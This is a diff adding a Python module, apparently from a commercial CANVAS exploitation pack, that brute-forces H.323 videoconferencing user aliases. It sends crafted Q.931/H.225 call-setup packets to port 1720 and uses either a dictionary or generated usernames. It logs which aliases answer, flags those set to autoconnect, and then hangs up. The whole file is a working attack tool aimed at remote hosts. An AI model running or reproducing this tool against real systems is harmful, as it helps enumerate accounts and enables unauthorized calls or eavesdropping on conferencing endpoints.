@@ -1,0 +1,293 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2014
+#
+
+###
+# STD Modules
+###
+import sys
+import random
+import select
+import socket
+import struct
+
+sys.path.append(".")
+
+###
+# CANVAS Modules
+###
+import canvasengine
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+###
+# Description
+###
+NAME = "d2sec_h323_bf"
+VERSION = "0.1"
+DESCRIPTION = "H323 Bruteforcer Tool"
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Tool"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+DOCUMENTATION = {}
+DOCUMENTATION["Vendor"] = ""
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = ""
+DOCUMENTATION["Date public"] = ""
+DOCUMENTATION["References"] = ""
+DOCUMENTATION["CVE Name"] = ""
+DOCUMENTATION["CVE Url"] = ""
+DOCUMENTATION["Notes"] = """Usage1: d2sec_h323_bf -t host -O dictionary:<text file>
+  host: H.323 domain to bruteforce
+  dictionary: text file'
+
+Usage2: d2sec_h323_bf -t host -O minchars:<min chars> -O maxchars:<max chars> [-O charset:<charset>]
+  host: H.323 domain to bruteforce
+  minchars: minimum user characters
+  maxchars: maximum user characters
+  charset: characters to generate usernames from
+""" 
+
+
+CHANGELOG="""
+"""
+
+TPKT_HDR = "\x03\x00"
+
+# H323 packet len
+
+Q931_HDR1 = "\x08\x02\x72\x6b\x05\x04\x04\x88\x18\x88\xa5\x28\x06\x5f\x54\x45\x53\x54\x5f\x7e"
+
+# H225 packet len
+
+Q931_HDR2 = "\x05\x60\xb8\x06\x00\x08\x91\x4a\x00\x05\x01\x40\x05\x00\x61\x00\x6c\x00\x66\x00\x72\x00\x65\x00\x64\x22\xc0\xb5\x00\x23\x31\x27\x50\x6f\x6c\x79\x63\x6f\x6d\x20\x52\x65\x61\x6c\x50\x72\x65\x73\x65\x6e\x63\x65\x20\x44\x65\x73\x6b\x74\x6f\x70\x20\x66\x6f\x72\x20\x57\x69\x6e\x64\x6f\x77\x73\x0a\x33\x2e\x32\x2e\x31\x2e\x34\x38\x36\x39\x37\x00\x01\x80" #\x0f"
+
+# destination string len (2 bytes for string len + strlen(string))
+# h323:
+# user\0
+# ip
+
+Q931_HDR3 = "\x06\xb8\x00"
+
+# token
+
+Q931_HDR4 = "\x00\xd5\xcd\x98\x08\x07\x00\xd9\x80\x0e\xf6\x06\xb8\x11\x00"
+
+# token
+
+Q931_HDR5 = "\x02\x01\x20\x81\xaf\x03\x00\x00\x07\x00\x08\x81\x6b\x00\x03\x18\x10\x00\x07\x00\x08\x81\x6b\x00\x03\x28\x00\x02\x00\x6f\x4e\xc2\x7e\xf0\xd7\xa2\xcf\x77\x43\x50\xa4\x72\x35\x14\xdd\xdf\x97\x21\x21\xab\x2f\x99\x74\x40\x5f\x38\x23\x8f\x2a\x73\x11\x1c\xb8\x34\xff\xb7\x06\xb5\x0c\x56\x88\xf6\x0f\xce\x50\x01\xcd\x48\xf7\x2e\xbb\xc8\xa1\x17\xa5\xd5\x58\xbd\xfd\x95\xb2\x23\xfa\x02\x00\x91\xcf\xd2\x25\xaa\x91\x4c\xcd\x35\x21\x95\x91\x4c\xe5\x8d\x20\x18\xa1\x61\x0a\xad\xcd\x41\x40\xa9\x51\x29\x33\xbe\xdb\x10\x60\x14\x69\x91\xe6\x1c\x1f\x4d\x5d\x25\x8e\x58\x13\x60\x50\x24\x88\x45\x3d\xfb\xb1\x19\x73\x51\x89\x2c\xa5\x4a\xe9\x9d\xae\x71\xd7\x00\x08\x02\x10\x00\x07\x00\x08\x81\x6b\x00\x03\x2b\x00\x04\x00\x09\x45\xC2\x9a\x3a\xc9\x9f\xa6\x81\x29\xb0\x25\xbb\xd9\x9a\xf4\x16\xa9\x2e\x42\x0d\x4e\x1a\x2b\x60\x9e\x29\x1e\x94\xf4\xe7\xe9\xee\x28\xf6\x2e\xcd\xec\x9c\xa1\x50\xaf\x04\x79\xc6\x51\x03\xaa\x89\x35\x43\xe0\x0d\xfb\x2e\x28\x2c\xca\x74\x5c\x1a\x5f\x92\x7e\x6b\xdc\x48\x47\xae\xf3\xed\xdc\x30\x61\x10\x1c\x43\x58\xd1\x36\x3b\xdb\x6c\x42\xc1\xef\xee\xbe\xe7\x59\xc2\x4f\x75\xed\x34\x4d\x50\xc5\x78\x0c\x44\xab\x5f\x53\x01\x07\x43\xd8\x23\xb6\x93\x64\x6a\x32\xb9\xfa\x3a\xe1\xef\x64\xe6\xfa\xfe\xe2\xa8\xfd\xa6\xc8\x04\x00\xff\xff\xff\xff\xff\xff\xff\xff\xc9\x0f\xda\xa2\x21\x68\xc2\x34\xc4\xc6\x62\x8b\x80\xdc\x1c\xd1\x29\x02\x4e\x08\x8a\x67\xcc\x74\x02\x0b\xbe\xa6\x3b\x13\x9b\x22\x51\x4a\x08\x79\x8e\x34\x04\xdd\xef\x95\x19\xb3\xcd\x3a\x43\x1b\x30\x2b\x0a\x6d\xf2\x5f\x14\x37\x4f\xe1\x35\x6d\x6d\x51\xc2\x45\xe4\x85\xb5\x76\x62\x5e\x7e\xc6\xf4\x4c\x42\xe9\xa6\x37\xed\x6b\x0b\xff\x5c\xb6\xf4\x06\xb7\xed\xee\x38\x6b\xfb\x5a\x89\x9f\xa5\xae\x9f\x24\x11\x7c\x4b\x1f\xe6\x49\x28\x66\x51\xec\xe6\x53\x81\xff\xff\xff\xff\xff\xff\xff\xff\x00\x08\x02\x01\x00\x01\x00\x01\x00\x01\x00\x01\x00\x01\x40\x09\x01\x40\x00\x13\x00\x00\x00\x00\x01\x10\x80\x01\x00\x00\x05\x0c\x73\x65\x74\x75\x70\x20\x6d\x65\x73\x73\x61\x67\x65"
+
+TOKEN_LEN = 16
+
+FIXED_LEN = len(TPKT_HDR) + \
+            2 + \
+            len(Q931_HDR1) + \
+            2 + \
+            len(Q931_HDR2) + \
+            3 + \
+            len('h323:') + \
+            5 + \
+            len(Q931_HDR3) + \
+            TOKEN_LEN + \
+            len(Q931_HDR4) + \
+            TOKEN_LEN + \
+            len(Q931_HDR5)
+
+HANGUP_TKIP = "\x03\x00\x00\x33"
+
+HANGUP_Q931_1 = "\x08\x02\x72\x6b\x5a\x7e\x00\x27\x05\x25\xc0\x06\x00\x08\x91\x4a\x00\x05\x58\x88\xc0\x11\x00"
+
+# token
+
+HANGUP_Q931_2 = "\x01\x00\x01\x40\x10\x80\x01\x00"
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.name = NAME
+    self.host = ''
+    self.dictionary = ''
+    self.minchars = 0
+    self.maxchars = 0
+    self.charset = ''
+	
+  def gentoken(self):
+    l = []
+    for nb in range(0, 16):
+      l.append(chr(random.randint(0x0, 0xff)))
+    return ''.join(l)
+
+  def tryit(self, user):
+    token = self.gentoken()
+    s = None
+    r = 1
+    while True:
+      try:
+        s = socket.create_connection((self.host, 1720))
+      except socket.error as msg:
+        self.log('[D2] %s'%msg)
+        return 2
+
+      # Send call request
+      to_send = TPKT_HDR + \
+        struct.pack('>h', FIXED_LEN + len(user)) + \
+        Q931_HDR1 + \
+        struct.pack('>h', 628 + len(user)) + \
+        Q931_HDR2 + \
+        chr(len('h323:') + len(user) + 2) + \
+        struct.pack('>h', len(user) + len('h323:') - 1) + \
+        'h323:' + \
+        user + \
+        "\x00" + \
+        socket.inet_aton(self.host) + \
+        Q931_HDR3 + \
+        token + \
+        Q931_HDR4 + \
+        token + \
+        Q931_HDR5
+      s.send(to_send)
+
+      # Check answer
+      try:
+        res = s.recv(100)
+      except Exception, e:
+        self.log('[D2] Error: %s'%e)
+        r = 2
+        break
+      c = res[8:9]
+
+      # Answer is NOT OK
+      if c == '\x5a':
+        # Invalid token, regenerate it
+        e = res[22:25]
+        if e == '\x8a\x01\x00':
+          self.log('[D2] warning: token burnt')
+          token = self.gentoken()
+          s.close()
+          continue
+        # Some other error was triggered or called number doesn't exist
+        else:
+          self.log('[D2] %s@%s: failed' % (user, self.host))
+          r = 0
+          break
+      else:
+        # Get next answer, we are waiting for a "CallProceeding" one
+        s.setblocking(0)
+        rdy = select.select([s], [], [], 1) # WARNING: YOU MAY HAVE TO CHANGE THE TIMEOUT OF 1 SEC HERE
+        # No call proceeding after timeout, number is unreachable
+        if not rdy[0]:
+          self.log('[D2] %s@%s: failed' % (user, self.host))
+          r = 0
+          break
+        try:
+          res = s.recv(100)
+        except Exception, e:
+          self.log('[D2] Error: %s'%msg)
+          r = 0
+          break
+        c = res[8:9]
+        # Received a 'CallProceeding' answer, called number is valid
+        if c == '\x01':
+          self.log('[D2] %s@%s: OK' % (user, self.host))
+          # Find out if this number has autoconnect activated
+          rdy = select.select([s], [], [], 2) # WARNING: YOU MAY HAVE TO CHANGE THE TIMEOUT OF 1 SEC HERE
+          if rdy[0]:
+            res = s.recv(500)
+            c = res[8:9]
+            if c == '\x07':
+              self.log('[D2] %s@%s: AUTOCONNECT' % (user, self.host))
+          # Send hangup to avoid screwing with bad coded servers
+          to_send = HANGUP_TKIP + HANGUP_Q931_1 + token + HANGUP_Q931_2
+          s.send(to_send)
+        # Another case of wrong number
+        else:
+          self.log('[D2] %s@%s: failed' % (user, self.host))
+          r = 0
+        break
+    s.close()
+    return r
+
+  def do_brute_rec(self, cur_size, chars, l):
+    if len(l) == cur_size:
+      return self.tryit(''.join(l))
+    for cur_c in range(0, len(chars)):
+      n = list(l)
+      n.append(chars[cur_c])
+      r = self.do_brute_rec(cur_size, chars, n)
+      if r == 2:
+        self.log('[D2] Is really a H323 service ??')
+        break
+
+  def do_brute(self, 
+              chars = """abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!#$%&'*+-/=?^_`{|}~."""):
+    r = 1 
+    for nb in range(self.minchars, self.maxchars):
+      l = []
+      r = self.do_brute_rec(nb, chars, l)
+      if r == 2:
+        break
+    return r
+
+  def do_dico(self):
+    users = open(self.dictionary).readlines()
+    r = 1
+    for user in users:
+      to_try = user.lstrip().rstrip() + '@' + self.host
+      r = self.tryit(to_try)
+      if r == 2: 
+        return 0
+    return r
+
+  def getargs(self):
+    self.host = self.target.interface
+    self.dictionary = self.argsDict.get("dictionary", self.dictionary)
+    self.minchars = int(self.argsDict.get("minchars", self.minchars))
+    self.maxchars = int(self.argsDict.get("maxchars", self.maxchars))
+    self.charset = self.argsDict.get("charset", self.charset)
+
+  def run(self):
+    self.setInfo("%s attacking %s" % (NAME, self.host))
+    self.log("[D2] %s attacking %s" % (NAME, self.host))
+    self.getargs()
+    r = 0
+    if self.dictionary:
+      r = self.do_dico()
+    elif self.minchars and self.maxchars and not self.dictionary:
+      if self.charset:
+        r = self.do_brute(self.charset)
+      else:
+        r = self.do_brute()
+    else:
+      self.log('[D2] See usage...')
+      r = 0
+    self.log("[D2] %s attacking %s - done" % (NAME, self.host))
+    self.setInfo("%s attacking %s - done" % (NAME, self.host))
+    return r
+
+  def usage(self):
+    print 'usage is: %s -O domain:<domain> -O dictionary:<text file>' % sys.argv[0]
+    print '\tdomain: H.323 domain to bruteforce'
+    print '\ttext file: dictionary'
+    print '\nusage is: %s -O domain:<domain> -O minchars:<min chars> -O maxchars:<max chars> [-O charset:<charset>]' % sys.argv[0]
+    print '\tdomain: H.323 domain to bruteforce'
+    print '\tmin chars: minimum user characters'
+    print '\tmax chars: maximum user characters'
+    print '\tcharset: characters to generate usernames from'
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME,VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
